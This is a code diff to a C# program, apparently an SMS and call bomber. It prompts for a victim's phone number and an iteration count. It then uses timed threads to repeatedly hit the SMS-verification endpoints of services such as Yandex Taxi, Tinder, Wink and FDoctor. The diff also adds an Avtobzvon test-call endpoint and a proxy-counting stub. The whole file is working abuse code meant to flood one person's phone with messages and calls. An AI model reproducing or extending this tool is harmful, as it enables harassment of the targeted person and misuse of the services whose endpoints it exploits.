@@ -10,6 +10,9 @@ namespace test
     class MainClass
     {
         static string basePhone = "9029885784"; //without country code
+        static int amount = 1;
+
+        static int aDelay60s = 5, aDelay30s = 1, aDelay20s = 3;
 
         static YandexTaxi yandexTaxi = new YandexTaxi(basePhone);
         static Tinder tinder = new Tinder(basePhone);
@@ -19,17 +22,29 @@ namespace test
         static YandexEda yandexEda = new YandexEda(basePhone);
         static Wink wink = new Wink(basePhone);
         static FDoctor fDoctor = new FDoctor(basePhone);
+        static Avtobzvon avtobzvon = new Avtobzvon(basePhone);
 
         public static void Main(string[] args)
         {
+            CustomInput();
             Thread delay60 = new Thread(() => Delay60s());
             Thread delay30 = new Thread(() => Delay30s());
             Thread delay20 = new Thread(() => Delay20s());
 
-            GetIP();
-            //delay60.Start();
-            //delay30.Start();
-            //delay20.Start();
+            //GetIP();
+
+            delay60.Start();
+            delay30.Start();
+            delay20.Start();
+        }
+
+        public static void CustomInput()
+        {
+            Console.WriteLine("Введите номер без кода страны:");
+            basePhone = Console.ReadLine();
+            Console.WriteLine("Введите количество итераций:");
+            amount = Convert.ToInt32(Console.ReadLine());
+            Console.WriteLine($"Итоговое количество сообщений - {aDelay60s * amount} + {aDelay30s * amount * 2} + {aDelay20s * amount * 3} = {amount * (aDelay60s + aDelay30s * 2 + aDelay20s *3)}");
         }
 
         public static void ShowAnswer(WebRequest request)
@@ -43,6 +58,8 @@ namespace test
 
         public static void GetIP()
         {
+            int count = File.ReadAllLines("/home/r3pl1c4nt/Documents/GitHub/b0mb3r_test/test/proxy.txt").Length;
+            Console.WriteLine(count);
             string proxy = "31.14.131.70";
             int port = 8080;
             WebProxy myproxy = new WebProxy(proxy, port);
@@ -75,13 +92,14 @@ namespace test
 
         public static void Delay60s()
         {
-            for (int i = 0; i < 1; ++i)
+            for (int i = 0; i < amount; ++i)
             {
                 Console.WriteLine(" ===== 60s delay =====");
                 yandexTaxi.SendYaTaxiPOST();
                 karusel.SendKaruselPOST();
                 belkaCar.SendBelkaCarPOST();
                 yandexEda.SenYaEdaPOST();
+                avtobzvon.SendAvtobzvonGET();
                 Thread.Sleep(61000);
             }
 
@@ -89,7 +107,7 @@ namespace test
 
         public static void Delay30s()
         {
-            for (int i = 0; i < 1; ++i)
+            for (int i = 0; i < amount * 2; ++i)
             {
                 Console.WriteLine("===== 30s delay =====");
                 wink.SendWinkPOST();
@@ -99,7 +117,7 @@ namespace test
 
         public static void Delay20s()
         {
-            for (int i = 0; i < 1; ++i)
+            for (int i = 0; i < amount * 3; ++i)
             {
                 Console.WriteLine("===== 20s delay =====");
                 tinder.SendTinderPOST();
@@ -362,6 +380,26 @@ namespace test
             public void SendFDoctorGET()
             {
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://my.fdoctor.ru/ajax/auth-simple/send_sms.php?auth-phone=" + phone + "&PHONE=" + phone);
+
+                request.Method = "GET";
+                request.Headers["X-Requested-With"] = "XMLHttpRequest";
+
+                ShowAnswer(request);
+            }
+
+            private static string phone;
+        }
+
+        class Avtobzvon //interval ???s
+        {
+            public Avtobzvon(string temp)
+            {
+                phone = "7" + temp;
+            }
+
+            public void SendAvtobzvonGET()
+            {
+                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://avtobzvon.ru/request/makeTestCall?to=" + phone);
 
                 request.Method = "GET";
                 request.Headers["X-Requested-With"] = "XMLHttpRequest";
